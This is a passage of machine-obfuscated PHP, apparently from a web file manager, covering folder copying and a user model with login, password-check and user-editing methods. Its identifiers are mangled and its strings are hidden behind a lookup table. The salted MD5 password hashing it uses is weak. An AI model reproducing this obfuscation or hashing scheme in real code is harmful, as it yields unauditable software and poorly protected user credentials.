KodIO::ioFileDriverGet($æùµ¥Ø˜[485] . $¥£õ­ª· . $æùµ¥Ø˜[404]); $this->_copyChildTo($®çÕáƒ, $óµòá˜‰, $Ù‘Ÿóïï, $®òé´®‹, $—Üü¿óô, $ÓÎ¼³ì, $ç¿Õ‰ê³); Hook::trigger($æùµ¥Ø˜[676]); if ($Ù‘Ÿóïï) { $this->folderSizeResetChildren($Ù‘Ÿóïï); } $this->_childrenListClear(); Model($æùµ¥Ø˜[639])->addAll($—Üü¿óô[$æùµ¥Ø˜[637]], array(), !0); Model($æùµ¥Ø˜[640])->eventCopy($Ù‘Ÿóïï); $this->saveAll($—Üü¿óô[$æùµ¥Ø˜[638]]); Model($æùµ¥Ø˜[548])->linkAdd($—Üü¿óô[$æùµ¥Ø˜[636]]); Model($æùµ¥Ø˜[548])->remove($—Üü¿óô[$æùµ¥Ø˜[674]]); $this->folderSizeReset($¥£õ­ª·); $this->updateModifyTime($¥£õ­ª·); return $Ù‘Ÿóïï; } private function _copyChildTo($Œ®¹Ûš, $¶•òöŞ¿, $ÀÒÕµ¢ı, $şÏ°¦Ï, &$ĞÔ³Õ¢¤, $¸ºÛÁ®û, $çÁá™šÊ) { $Ÿ²§üäÑ =& $_SERVER[ıÚ˜š²İ]; $Ù„ü­¨ = $this->sourceInfoCache($ÀÒÕµ¢ı); $œ»Êä¢Å = $Œ®¹Ûš->listPath($¶•òöŞ¿); $œ»Êä¢Å = $œ»Êä¢Å ? $œ»Êä¢Å : array($Ÿ²§üäÑ[86] => array(), $Ÿ²§üäÑ[85] => array()); $şÇáåØ¹ = array_merge($œ»Êä¢Å[$Ÿ²§üäÑ[86]], $œ»Êä¢Å[$Ÿ²§üäÑ[85]]); $ª°§¹ëÕ = $this->_addFiles($Œ®¹Ûš, $çÁá™šÊ, $œ»Êä¢Å[$Ÿ²§üäÑ[86]], $¸ºÛÁ®û); $Ñ­¨¥ı = array(); foreach ($şÇáåØ¹ as &$Û•Îß¡) { if (isset($ª°§¹ëÕ[$Û•Îß¡[$Ÿ²§üäÑ[32]]])) { $Û•Îß¡ = $ª°§¹ëÕ[$Û•Îß¡[$Ÿ²§üäÑ[32]]]; } $Û•Îß¡[$Ÿ²§üäÑ[487]] = $Û•Îß¡[$Ÿ²§üäÑ[33]] == $Ÿ²§üäÑ[78]; $Û•Îß¡[$Ÿ²§üäÑ[488]] = substr(_get($Û•Îß¡, $Ÿ²§üäÑ[169], $Ÿ²§üäÑ[12]), 0, 10); $Û•Îß¡[$Ÿ²§üäÑ[79]] = _get($Û•Îß¡, $Ÿ²§üäÑ[79], 0); $Û•Îß¡[$Ÿ²§üäÑ[545]] = _get($Û•Îß¡, $Ÿ²§üäÑ[545], 0); if (!isset($Û•Îß¡[$Ÿ²§üäÑ[677]]) && $Û•Îß¡[$Ÿ²§üäÑ[545]]) { $ĞÔ³Õ¢¤[$Ÿ²§üäÑ[674]][] = $Û•Îß¡[$Ÿ²§üäÑ[545]]; } if ($şÏ°¦Ï) { $Øû…ïÌ§ = $this->fileNameExistCache($ÀÒÕµ¢ı, $Û•Îß¡[$Ÿ²§üäÑ[32]]); if ($Øû…ïÌ§) { if ($Û•Îß¡[$Ÿ²§üäÑ[487]] || $şÏ°¦Ï == REPEAT_SKIP) { continue; } if ($şÏ°¦Ï == REPEAT_REPLACE) { $Øä“€–Ğ = $this->sourceInfoCache($Øû…ïÌ§); $­Ôç«Û = $this->fileHistory($Øä“€–Ğ, $Û•Îß¡[$Ÿ²§üäÑ[545]], $Û•Îß¡[$Ÿ²§üäÑ[79]]); if ($­Ôç«Û) { $ĞÔ³Õ¢¤[$Ÿ²§üäÑ[636]][] = $Û•Îß¡[$Ÿ²§üäÑ[545]]; } continue; } else { if ($şÏ°¦Ï == REPEAT_RENAME) { $Û•Îß¡[$Ÿ²§üäÑ[32]] = $this->fileNameAutoCache($ÀÒÕµ¢ı, $Û•Îß¡[$Ÿ²§üäÑ[32]], $şÏ°¦Ï, !1); } } } } if (!$Û•Îß¡[$Ÿ²§üäÑ[487]] && $Û•Îß¡[$Ÿ²§üäÑ[545]] == 0) { continue; } if (!$Û•Îß¡[$Ÿ²§üäÑ[487]] && $Û•Îß¡[$Ÿ²§üäÑ[545]]) { $ĞÔ³Õ¢¤[$Ÿ²§üäÑ[636]][] = $Û•Îß¡[$Ÿ²§üäÑ[545]]; } $Ñ­¨¥ı[] = $this->_makeItemData($Û•Îß¡, $Ù„ü­¨, $Û•Îß¡[$Ÿ²§üäÑ[32]]); } unset($Û•Îß¡); if (!empty($Ñ­¨¥ı)) { $this->addAll($Ñ­¨¥ı); $this->_childrenListSelect($ÀÒÕµ¢ı); } $Ëê¸°Šé = $this->_childrenList($ÀÒÕµ¢ı); $Ëê¸°Šé = array_to_keyvalue($Ëê¸°Šé, $Ÿ²§üäÑ[32]); foreach ($şÇáåØ¹ as $Û•Îß¡) { $Øä“€–Ğ = $Ëê¸°Šé[$Û•Îß¡[$Ÿ²§üäÑ[32]]]; $Êî‚‡³Œ = $Øä“€–Ğ[$Ÿ²§üäÑ[194]]; $this->_copyApplyMeta($Øä“€–Ğ, $ĞÔ³Õ¢¤); if ($Û•Îß¡[$Ÿ²§üäÑ[33]] == $Ÿ²§üäÑ[78]) { $Û•Îß¡[$Ÿ²§üäÑ[87]] = $Œ®¹Ûš->getPathInner($Û•Îß¡[$Ÿ²§üäÑ[87]]); $this->_copyChildTo($Œ®¹Ûš, $Û•Îß¡[$Ÿ²§üäÑ[87]], $Êî‚‡³Œ, $şÏ°¦Ï, $ĞÔ³Õ¢¤, $¸ºÛÁ®û, $çÁá™šÊ); } } } private function _addFiles($€Ş›õ®š, $çùç–ßİ, $´æ‡Ğæ¿, $¶ÀşºÔ) { $¾´æ„Å =& $_SERVER[ıÚ˜š²İ]; if (!$´æ‡Ğæ¿ || count($´æ‡Ğæ¿) == 0) { return array(); } $½Ÿ€Œˆ† = array(); foreach ($´æ‡Ğæ¿ as &$«Ÿ¦îÙ) { Hook::trigger($¾´æ„Å[678], $«Ÿ¦îÙ); $«Ÿ¦îÙ[$¾´æ„Å[87]] = $€Ş›õ®š->getPathInner($«Ÿ¦îÙ[$¾´æ„Å[87]]); $³“§Î•® = $€Ş›õ®š->hashSimple($«Ÿ¦îÙ[$¾´æ„Å[87]]); $†´®İŒñ = $€Ş›õ®š->hashMd5($«Ÿ¦îÙ[$¾´æ„Å[87]]); if (strlen($†´®İŒñ) > 10 && !isset($½Ÿ€Œˆ†[$†´®İŒñ])) { $½Ÿ€Œˆ†[$†´®İŒñ] = array(); } $«Ÿ¦îÙ[$¾´æ„Å[679]] = $³“§Î•®; $«Ÿ¦îÙ[$¾´æ„Å[551]] = $†´®İŒñ; $½Ÿ€Œˆ†[$†´®İŒñ][] =& $«Ÿ¦îÙ; if (count($½Ÿ€Œˆ†[$†´®İŒñ]) > 1) { $«Ÿ¦îÙ[$¾´æ„Å[677]] = !0; } Hook::trigger($¾´æ„Å[680], $«Ÿ¦îÙ); } unset($«Ÿ¦îÙ); $ÖÂ×ÙÈÍ = array($¾´æ„Å[551] => array($¾´æ„Å[7], array_keys($½Ÿ€Œˆ†))); $‡åòÔÕÂ = Model($¾´æ„Å[681]); $êá¼»½Ï = $‡åòÔÕÂ->where($ÖÂ×ÙÈÍ)->select(); $êá¼»½Ï = $êá¼»½Ï ? $êá¼»½Ï : array(); foreach ($êá¼»½Ï as $¶‚¶øæ•) { if (!isset($½Ÿ€Œˆ†[$¶‚¶øæ•[$¾´æ„Å[551]]])) { continue; } $·Èê»ÃÎ = $½Ÿ€Œˆ†[$¶‚¶øæ•[$¾´æ„Å[551]]]; foreach ($·Èê»ÃÎ as &$«Ÿ¦îÙ) { $«Ÿ¦îÙ[$¾´æ„Å[545]] = $¶‚¶øæ•[$¾´æ„Å[545]]; $«Ÿ¦îÙ[$¾´æ„Å[677]] = !0; } unset($«Ÿ¦îÙ); } $”«”²›› = array(); foreach ($´æ‡Ğæ¿ as $¥ÊŠû‚¯) { Hook::trigger($¾´æ„Å[682], $¥ÊŠû‚¯); if (isset($¥ÊŠû‚¯[$¾´æ„Å[677]]) && $¥ÊŠû‚¯[$¾´æ„Å[677]]) { Hook::trigger($¾´æ„Å[683], $¥ÊŠû‚¯); continue; } $…”éø‡ú = $€Ş›õ®š->getPathInner($¥ÊŠû‚¯[$¾´æ„Å[87]]); $”İĞË•ú = $‡åòÔÕÂ->addFileMake($…”éø‡ú, $çùç–ßİ, $¥ÊŠû‚¯[$¾´æ„Å[79]], $¥ÊŠû‚¯[$¾´æ„Å[679]], $¥ÊŠû‚¯[$¾´æ„Å[551]], $¥ÊŠû‚¯[$¾´æ„Å[32]], $¶ÀşºÔ); Hook::trigger($¾´æ„Å[683], $¥ÊŠû‚¯); if (!is_array($”İĞË•ú)) { continue; } $”«”²››[] = $”İĞË•ú; } $‡åòÔÕÂ->addAll($”«”²››); $ÖÂ×ÙÈÍ = array($¾´æ„Å[551] => array($¾´æ„Å[7], array_keys($½Ÿ€Œˆ†))); $êá¼»½Ï = $‡åòÔÕÂ->where($ÖÂ×ÙÈÍ)->select(); $êá¼»½Ï = $êá¼»½Ï ? $êá¼»½Ï : array(); foreach ($êá¼»½Ï as $¶‚¶øæ•) { if (!isset($½Ÿ€Œˆ†[$¶‚¶øæ•[$¾´æ„Å[551]]])) { continue; } $¯¢ÀÛ¥» =& $½Ÿ€Œˆ†[$¶‚¶øæ•[$¾´æ„Å[551]]]; foreach ($¯¢ÀÛ¥» as &$«Ÿ¦îÙ) { $«Ÿ¦îÙ[$¾´æ„Å[545]] = $¶‚¶øæ•[$¾´æ„Å[545]]; } unset($«Ÿ¦îÙ); } $ñÇ±€ÊÏ = array(); foreach ($´æ‡Ğæ¿ as $¯è‚ÉœŒ) { $ñÇ±€ÊÏ[$¯è‚ÉœŒ[$¾´æ„Å[32]]] = $¯è‚ÉœŒ; } return $ñÇ±€ÊÏ; } } define($_SERVER[ıÚ˜š²İ][684], $_SERVER[ıÚ˜š²İ][685]); $ihoktzjwga = $_SERVER[ıÚ˜š²İ][686]; goto b‹ù¨ôØÛ; f‚ÆÙœœØ¦: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\141\155\145" => "\165\163\x65\162\x5f\155\x65\x74\x61", "\x6d\x65\x74\x61\x46\x69\x65\154\144" => "\x75\x73\x65\162\x49\x44"); protected $simpleField = "\x75\163\145\x72\111\x44\54\156\151\143\153\116\141\155\x65\54\x6e\x61\155\145\54\x61\166\x61\164\141\x72\x2c\x73\x65\x78\x2c\163\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÜÚáº’Œ) { $ÏÒ®î‰¿ =& $_SERVER[ıÚ˜š²İ]; $ ¿ØùÑ = $ÏÒ®î‰¿[2489]; return array($ÏÒ®î‰¿[2075] => array($ÜÚáº’Œ[0], $ ¿ØùÑ), $ÏÒ®î‰¿[2077] => array($ÜÚáº’Œ[0], $ ¿ØùÑ), $ÏÒ®î‰¿[2490] => array($ÜÚáº’Œ[0], $ ¿ØùÑ)); } protected function getInfo($‚¦¦âœ, $Òùö”™ = false) { $Ö´ÕõĞ = $this->getInfoSimple($‚¦¦âœ); if (!is_array($Ö´ÕõĞ)) { return array(); } if ($Òùö”™) { return $this->_getInfoApply($Ö´ÕõĞ); } return $this->cacheFunctionGet($_SERVER[ıÚ˜š²İ][2079], $‚¦¦âœ); } protected function getInfoFull($•ªƒ÷£í, $ò…€óĞ = false) { $¤ßÊíµ = $this->getInfoSimple($•ªƒ÷£í); if (!is_array($¤ßÊíµ)) { return array(); } if ($ò…€óĞ) { return $this->_getInfoApply($¤ßÊíµ, !0); } return $this->cacheFunctionGet($_SERVER[ıÚ˜š²İ][2491], $•ªƒ÷£í); } private function _getInfoApply($Éõ‡ÜÓ, $ÄÅ©ç§ò = false) { $ÆÇÆã±© =& $_SERVER[ıÚ˜š²İ]; if (!$Éõ‡ÜÓ) { return $Éõ‡ÜÓ; } $¢ÙÄ‘¨ = md5($ÆÇÆã±©[2492] . $Éõ‡ÜÓ[$ÆÇÆã±©[978]] . $ÆÇÆã±©[2493] . $Éõ‡ÜÓ[$ÆÇÆã±©[32]]); $Éõ‡ÜÓ = $this->_listDataApplyItem($Éõ‡ÜÓ); $“…ä¡œ = Model($ÆÇÆã±©[1442])->metaGet($Éõ‡ÜÓ[$ÆÇÆã±©[90]][$ÆÇÆã±©[194]]); $Éõ‡ÜÓ[$ÆÇÆã±©[2494]] = $¢ÙÄ‘¨; $Éõ‡ÜÓ[$ÆÇÆã±©[90]][$ÆÇÆã±©[2278]] = isset($“…ä¡œ[$ÆÇÆã±©[2279]]) ? $“…ä¡œ[$ÆÇÆã±©[2279]] : null; if ($ÄÅ©ç§ò) { $Éõ‡ÜÓ[$ÆÇÆã±©[543]] = $this->metaGet($Éõ‡ÜÓ[$ÆÇÆã±©[1792]]); } return $Éõ‡ÜÓ; } protected function getInfoSimple($ÀŠ¾¿Şƒ, $˜ßº‘à = false) { $¯§¼”Šƒ =& $_SERVER[ıÚ˜š²İ]; if (!$ÀŠ¾¿Şƒ) { return array(); } if ($˜ßº‘à) { $ù‘ä÷ƒÚ = $this->where(array($¯§¼”Šƒ[1792] => intval($ÀŠ¾¿Şƒ)))->find(); if (!is_array($ù‘ä÷ƒÚ)) { return array(); } $ù‘ä÷ƒÚ[$¯§¼”Šƒ[2495]] = Action($¯§¼”Šƒ[2496])->parseUrl($ù‘ä÷ƒÚ[$¯§¼”Šƒ[2495]]); return $ù‘ä÷ƒÚ; } return $this->cacheFunctionGet($¯§¼”Šƒ[2080], $ÀŠ¾¿Şƒ); } protected function getInfoSimpleOuter($òº¸ÕÍ ) { $×·Ÿşı¤ =& $_SERVER[ıÚ˜š²İ]; if (!$òº¸ÕÍ  || $òº¸ÕÍ  == 0) { return array($×·Ÿşı¤[1792] => $×·Ÿşı¤[231], $×·Ÿşı¤[32] => $×·Ÿşı¤[176] . LNG($×·Ÿşı¤[2497]) . $×·Ÿşı¤[178], $×·Ÿşı¤[2495] => STATIC_PATH . $×·Ÿşı¤[2498]); } $ØüŒãéÒ = $this->cacheFunctionGet($×·Ÿşı¤[2080], $òº¸ÕÍ ); $ï˜¶ÀŒ© = array_field_key($ØüŒãéÒ, explode($×·Ÿşı¤[50], $this->simpleField)); if (!$ï˜¶ÀŒ©) { return array($×·Ÿşı¤[1792] => $×·Ÿşı¤[1287], $×·Ÿşı¤[32] => $×·Ÿşı¤[176] . LNG($×·Ÿşı¤[2499]) . $×·Ÿşı¤[178], $×·Ÿşı¤[2495] => STATIC_PATH . $×·Ÿşı¤[2500]); } $ï˜¶ÀŒ©[$×·Ÿşı¤[2495]] = Action($×·Ÿşı¤[2496])->parseUrl($ï˜¶ÀŒ©[$×·Ÿşı¤[2495]]); return $ï˜¶ÀŒ©; } protected function groupUser($ßÏÕ§É) { } public static function errorLang($Ñ•éù§É) { $¬‚ò¾»ü =& $_SERVER[ıÚ˜š²İ]; $É¬æ€ÉĞ = array(self::ERROR_USER_NOT_EXISTS => $¬‚ò¾»ü[2501], self::ERROR_USER_PASSWORD_ERROR => $¬‚ò¾»ü[2502], self::ERROR_USER_EXIST_NAME => $¬‚ò¾»ü[2503], self::ERROR_USER_EXIST_PHONE => $¬‚ò¾»ü[2504], self::ERROR_USER_EXIST_EMAIL => $¬‚ò¾»ü[2505], self::ERROR_USER_LOGIN_LOCK => $¬‚ò¾»ü[2506], self::ERROR_IP_NOT_ALLOW => $¬‚ò¾»ü[2507], self::ERROR_USER_EXIST_NICKNAME => $¬‚ò¾»ü[2508]); $·–›à‚ = LNG($É¬æ€ÉĞ[$Ñ•éù§É]); if ($Ñ•éù§É == self::ERROR_USER_LOGIN_LOCK) { $¨ıÉÒ‹™ = (int) Model($¬‚ò¾»ü[1398])->get($¬‚ò¾»ü[2509]); if ($¨ıÉÒ‹™ > 60) { $·–›à‚ = str_replace($¬‚ò¾»ü[91], ceil($¨ıÉÒ‹™ / 60), $·–›à‚); } } return $·–›à‚; } protected function metaSet($‚†ò‘ºÑ, $Ï§íƒâà = null, $Øü¸ù‡ù = null) { $this->clearCache($‚†ò‘ºÑ); return parent::metaSet($‚†ò‘ºÑ, $Ï§íƒâà, $Øü¸ù‡ù); } public function getInfoByMeta($ô¢¾åôÊ, $×“ÔğÔê) { $áòùø£Å =& $_SERVER[ıÚ˜š²İ]; $Ñá¥çŸü = Model($áòùø£Å[2510])->where(array($áòùø£Å[97] => $ô¢¾åôÊ, $áòùø£Å[452] => $×“ÔğÔê))->find(); if ($Ñá¥çŸü) { return $this->getInfo($Ñá¥çŸü[$áòùø£Å[1792]]); } return !1; } public function userLoginCheck($ˆÙ½°èÑ, $ÇÄ¬µîø, $Ô‡ü‡ì¢ = false) { $Áá‰Æù =& $_SERVER[ıÚ˜š²İ]; $Ò’€ÕñÄ = $this->userLoginFind($ˆÙ½°èÑ); if (!$Ò’€ÕñÄ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ò’€ÕñÄ[$Áá‰Æù[1792]], $ÇÄ¬µîø)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $Ô‡ü‡ì¢ ? $this->getInfoFull($Ò’€ÕñÄ[$Áá‰Æù[1792]]) : $this->getInfo($Ò’€ÕñÄ[$Áá‰Æù[1792]]); } public function userLoginFind($ˆõ‚ˆ³ ) { $Ø´ßõš =& $_SERVER[ıÚ˜š²İ]; $ÀßÊ«Õ† = array($Ø´ßõš[32] => $ˆõ‚ˆ³ , $Ø´ßõš[2291] => $ˆõ‚ˆ³ , $Ø´ßõš[382] => $ˆõ‚ˆ³ , $Ø´ßõš[2511] => $ˆõ‚ˆ³ , $Ø´ßõš[1089] => $Ø´ßõš[1091]); if ($this->nickNameRpt()) { unset($ÀßÊ«Õ†[$Ø´ßõš[2291]]); } return $this->where($ÀßÊ«Õ†)->find(); } public function clearCache($õ·§Úª¢) { $‰Ïõœ =& $_SERVER[ıÚ˜š²İ]; $this->cacheFunctionClear($‰Ïõœ[2079], $õ·§Úª¢); $this->cacheFunctionClear($‰Ïõœ[2080], $õ·§Úª¢); $this->cacheFunctionClear($‰Ïõœ[2491], $õ·§Úª¢); } public function userPasswordCheck($Å†³ ˆê, $Ì¼â÷ê) { $È‘ùáŒ =& $_SERVER[ıÚ˜š²İ]; $»ƒ‰Õó = $this->where(array($È‘ùáŒ[1792] => intval($Å†³ ˆê)))->find(); $ˆäİëïõ = $this->metaGet($Å†³ ˆê); $áâË¯°µ = isset($ˆäİëïõ[$È‘ùáŒ[2512]]) ? $ˆäİëïõ[$È‘ùáŒ[2512]] : $È‘ùáŒ[12]; if (md5($áâË¯°µ . trim($Ì¼â÷ê)) !== $»ƒ‰Õó[$È‘ùáŒ[978]]) { return !1; } return !0; } public function userAdd($¦Õµã) { $¼¹×õâ =& $_SERVER[ıÚ˜š²İ]; $ãæíõÂ© = array($¼¹×õâ[496] => $¦Õµã[$¼¹×õâ[32]], $¼¹×õâ[2513] => $¦Õµã[$¼¹×õâ[2202]], $¼¹×õâ[2514] => isset($¦Õµã[$¼¹×õâ[382]]) ? $¦Õµã[$¼¹×õâ[382]] : $¼¹×õâ[12], $¼¹×õâ[2515] => isset($¦Õµã[$¼¹×õâ[2511]]) ? $¦Õµã[$¼¹×õâ[2511]] : $¼¹×õâ[12], $¼¹×õâ[2516] => isset($¦Õµã[$¼¹×õâ[2291]]) ? $¦Õµã[$¼¹×õâ[2291]] : $¦Õµã[$¼¹×õâ[32]], $¼¹×õâ[2517] => isset($¦Õµã[$¼¹×õâ[2495]]) ? $¦Õµã[$¼¹×õâ[2495]] : $¼¹×õâ[12], $¼¹×õâ[2518] => isset($¦Õµã[$¼¹×õâ[2519]]) ? $¦Õµã[$¼¹×õâ[2519]] : 1, $¼¹×õâ[2520] => $¦Õµã[$¼¹×õâ[978]], $¼¹×õâ[2081] => isset($¦Õµã[$¼¹×õâ[1980]]) ? $¦Õµã[$¼¹×õâ[1980]] : 1024 * 1024 * 20, $¼¹×õâ[2082] => 0, $¼¹×õâ[2521] => 0, $¼¹×õâ[2127] => isset($¦Õµã[$¼¹×õâ[826]]) ? $¦Õµã[$¼¹×õâ[826]] : 1); if (!empty($¦Õµã[$¼¹×õâ[1792]])) { $ãæíõÂ©[$¼¹×õâ[1792]] = $¦Õµã[$¼¹×õâ[1792]]; } $ì‡«ãÖË = $this->_checkExist($¦Õµã); if ($ì‡«ãÖË !== !0) { return $ì‡«ãÖË; } if (!empty($ãæíõÂ©[$¼¹×õâ[2495]]) && strlen($ãæíõÂ©[$¼¹×õâ[2495]]) > 255) { $ãæíõÂ©[$¼¹×õâ[2495]] = $¼¹×õâ[12]; } $œ°îç£Â = $this->add($ãæíõÂ©); $©š™ãÊ = array($¼¹×õâ[2520] => $ãæíõÂ©[$¼¹×õâ[978]], $¼¹×õâ[2516] => $ãæíõÂ©[$¼¹×õâ[2291]], $¼¹×õâ[2522] => $¦Õµã[$¼¹×õâ[2086]]); $this->userEdit($œ°îç£Â, $©š™ãÊ); Model($¼¹×õâ[1442])->userRootAdd($œ°îç£Â); return $œ°îç£Â; } protected function userEditTest($¹‘ §³Ø, $’Á¶±¢) { return $this->call($_SERVER[ıÚ˜š²İ][2523], $¹‘ §³Ø, $’Á¶±¢); } protected function userEdit($Øñˆ¨èÙ, $œÂµÄ) { $âµ¦ºàÒ =& $_SERVER[ıÚ˜š²İ]; $“èŠ»Øè = $this->getInfoSimple($Øñˆ¨èÙ); if (!$“èŠ»Øè) { return !1; } $‹ŠŠ•Ú = $this->_checkExist($œÂµÄ, $Øñˆ¨èÙ); if ($‹ŠŠ•Ú !== !0) { return $‹ŠŠ•Ú; } if (isset($œÂµÄ[$âµ¦ºàÒ[978]]) && trim($œÂµÄ[$âµ¦ºàÒ[978]]) != $âµ¦ºàÒ[12]) { $ÛŸåÊùÎ = $this->metaGet($Øñˆ¨èÙ); if (empty($ÛŸåÊùÎ[$âµ¦ºàÒ[2512]])) { $ÛŸåÊùÎ[$âµ¦ºàÒ[2512]] = rand_string(10); Model($âµ¦ºàÒ[581])->metaSet($Øñˆ¨èÙ, $âµ¦ºàÒ[2512], $ÛŸåÊùÎ[$âµ¦ºàÒ[2512]]); } $œÂµÄ[$âµ¦ºàÒ[978]] = md5($ÛŸåÊùÎ[$âµ¦ºàÒ[2512]] . trim($œÂµÄ[$âµ¦ºàÒ[978]])); } else { unset($œÂµÄ[$âµ¦ºàÒ[978]]); } if (!empty($œÂµÄ[$âµ¦ºàÒ[2495]]) && strlen($œÂµÄ[$âµ¦ºàÒ[2495]]) > 255) { $œÂµÄ[$âµ¦ºàÒ[2495]] = $âµ¦ºàÒ[12]; } if (isset($œÂµÄ[$âµ¦ºàÒ[2291]])) { $this->setNamePinyin($Øñˆ¨èÙ, $œÂµÄ[$âµ¦ºàÒ[2291]]); } if (isset($œÂµÄ[$âµ¦ºàÒ[2086]])) { $ˆ›ĞœÛ¶ = $âµ¦ºàÒ[1401] . $Øñˆ¨èÙ; $Ê·¢Äª = $âµ¦ºàÒ[1399]; $Ãõß–©³ = $œÂµÄ[$âµ¦ºàÒ[2086]] ? $œÂµÄ[$âµ¦ºàÒ[2086]] : $âµ¦ºàÒ[12]; $´Ãå‚£å = Model($âµ¦ºàÒ[1398])->get($ˆ›ĞœÛ¶, $Ê·¢Äª); $´Ãå‚£å = $´Ãå‚£å ? $´Ãå‚£å : $âµ¦ºàÒ[12]; if ($´Ãå‚£å != $Ãõß–©³) { if (!$Ãõß–©³ && $´Ãå‚£å) { Model($âµ¦ºàÒ[1398])->remove($ˆ›ĞœÛ¶, $Ê·¢Äª); } else { if ($Ãõß–©³) { Model($âµ¦ºàÒ[1398])->set($ˆ›ĞœÛ¶, $Ãõß–©³, $Ê·¢Äª); } } } unset($œÂµÄ[$âµ¦ºàÒ[2086]]); Model($âµ¦ºàÒ[601])->metaSet($Øñˆ¨èÙ, $âµ¦ºàÒ[2086], $Ãõß–©³); } if (empty($œÂµÄ)) { return !0; } $this->where(array($âµ¦ºàÒ[1783] => $Øñˆ¨èÙ))->save($œÂµÄ); $this->clearCache($Øñˆ¨èÙ); return !0; } public function setNamePinyin($ßº¼†®Ğ, $Ö•„Ø€€ = false) { $œ±Ø›¸Å =& $_SERVER[ıÚ˜š²İ]; if (!$Ö•„Ø€€) { $¾âœõú» = $this->getInfoSimple($ßº¼†®Ğ); $Ö•„Ø€€ = $¾âœõú»[$œ±Ø›¸Å[2291]] ? $¾âœõú»[$œ±Ø›¸Å[2291]] : $¾âœõú»[$œ±Ø›¸Å[32]]; } $òÌÑÛ† = Model($œ±Ø›¸Å[601]); if (!Input::check($Ö•„Ø€€, $œ±Ø›¸Å[662])) { return $òÌÑÛ†->metaSet($ßº¼†®Ğ, array($œ±Ø›¸Å[540] => $œ±Ø›¸Å[12], $œ±Ø›¸Å[539] => $œ±Ø›¸Å[12])); } return $òÌÑÛ†->metaSet($ßº¼†®Ğ, array($œ±Ø›¸Å[540] => str_replace($œ±Ø›¸Å[53], $œ±Ø›¸Å[12], Pinyin::get($Ö•„Ø€€)), $œ±Ø›¸Å[539] => Pinyin::get($Ö•„Ø€€, $œ±Ø›¸Å[663]))); } private function nickNameRpt() { $ÍÒÚÁİü =& $_SERVER[ıÚ˜š²İ]; $ºÊŠºÅÈ = Model($ÍÒÚÁİü[847])->get($ÍÒÚÁİü[2524]); $ûÅÕÏĞµ = $GLOBALS[$ÍÒÚÁİü[6]][$ÍÒÚÁİü[459]][$ÍÒÚÁİü[2524]]; $†–à¢ = !is_null($ºÊŠºÅÈ) ? $ºÊŠºÅÈ : $ûÅÕÏĞµ; return !!$†–à¢; } private function _checkExist($«‚ñóÅ€, $­öÖÒ×¼ = false) { $›Ç‘€ü† =& $_SERVER[ıÚ˜š²İ]; $¤Í¡¢Ï = array($›Ç‘€ü†[32] => UserModel::ERROR_USER_EXIST_NAME, $›Ç‘€ü†[2291] => UserModel::ERROR_USER_EXIST_NICKNAME, $›Ç‘€ü†[382] => UserModel::ERROR_USER_EXIST_EMAIL, $›Ç‘€ü†[2511] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¤Í¡¢Ï[$›Ç‘€ü†[2291]]); } $ï¤ÈÑŠ = $­öÖÒ×¼ ? array($›Ç‘€ü†[1792] => array($›Ç‘€ü†[2525], $­öÖÒ×¼)) : array(); foreach ($¤Í¡¢Ï as $©ÄÂôÙ• => $Ì”®Õ†À) { $×Å–íÑ‰ = array(); foreach ($¤Í¡¢Ï as $õˆ˜ı« => $íÖ€Å’) { if (isset($«‚ñóÅ€[$õˆ˜ı«]) && $«‚ñóÅ€[$õˆ˜ı«]) { $×Å–íÑ‰[] = $«‚ñóÅ€[$õˆ˜ı«]; } } if (!$×Å–íÑ‰) { continue; } $Ê ÔŒ‘ = array_merge(array($©ÄÂôÙ• => array($›Ç‘€ü†[7], $×Å–íÑ‰)), $ï¤ÈÑŠ); $ĞÂ­ùß = $this->where($Ê ÔŒ‘)->find(); if ($ĞÂ­ùß) { return $Ì”®Õ†À; } } return !0; } public function userListInfo($²Ì¬ş‘ª) { $äÜ›”Ñ® =& $_SERVER[ıÚ˜š²İ]; $‡ÕÃÊ©ä = array(); $²Ì¬ş‘ª = is_array($²Ì¬ş‘ª) ? array_unique($²Ì¬ş‘ª) : array(); if (!$²Ì¬ş‘ª) { return $‡ÕÃÊ©ä; } if (count($²Ì¬ş‘ª) < 20) { foreach ($²Ì¬ş‘ª as $œğñÀÌÆ) { $‡ÕÃÊ©ä[$œğñÀÌÆ . $äÜ›”Ñ®[12]] = $this->getInfoSimpleOuter($œğñÀÌÆ); } } else { $ş·íÅà¶ = array($äÜ›”Ñ®[1783] => array($äÜ›”Ñ®[494], $²Ì¬ş‘ª)); if (count($²Ì¬ş‘ª) == 1) { $ş·íÅà¶ = array($äÜ›”Ñ®[1783] => $²Ì¬ş‘ª[0]); } $Ü‚¹÷·ú = Model($äÜ›”Ñ®[581])->field($this->simpleField)->where($ş·íÅà¶)->select(); $Ü‚¹÷·ú = array_to_keyvalue($Ü‚¹÷·ú, $äÜ›”Ñ®[1792]); foreach ($²Ì¬ş‘ª as $œğñÀÌÆ) { $Ï—ÈŠ°› = $Ü‚¹÷·ú[$œğñÀÌÆ]; if (!$Ï—ÈŠ°›) { $‡ÕÃÊ©ä[$œğñÀÌÆ . $äÜ›”Ñ®[12]] = $this->getInfoSimpleOuter($œğñÀÌÆ); continue; } $Ï—ÈŠ°›[$äÜ›”Ñ®[2495]] = Action($äÜ›”Ñ®[2496])->parseUrl($Ï—ÈŠ°›[$äÜ›”Ñ®[2495]]); $‡ÕÃÊ©ä[$œğñÀÌÆ . $äÜ›”Ñ®[12]] = $Ï—ÈŠ°›; } } return $‡ÕÃÊ©ä; } protected function userStatus($º·ÄöÉ, $¼«Èóî) { $»ûòŒÓ€ = $this->getInfoSimple($º·ÄöÉ); if (!$»ûòŒÓ€) { return !1; } $Ø¿š‚åï = array($_SERVER[ıÚ˜š²İ][826] => $¼«Èóî); return $this->userEdit($º·ÄöÉ, $Ø¿š‚åï); } protected function userRemove($¨¨ûş¦Â) { $´‰…ù×Õ =& $_SERVER[ıÚ˜š²İ]; $Áí÷ß¶Â = 